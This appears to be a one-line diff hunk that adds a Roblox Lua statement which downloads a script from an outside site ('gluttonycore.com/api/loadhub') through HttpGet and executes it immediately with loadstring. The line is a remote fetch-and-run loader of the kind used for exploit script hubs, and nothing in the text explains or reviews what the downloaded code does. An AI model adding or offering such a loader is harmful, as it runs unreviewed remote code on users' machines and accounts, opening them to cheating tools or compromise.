@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.gluttonycore.com/api/loadhub"))()
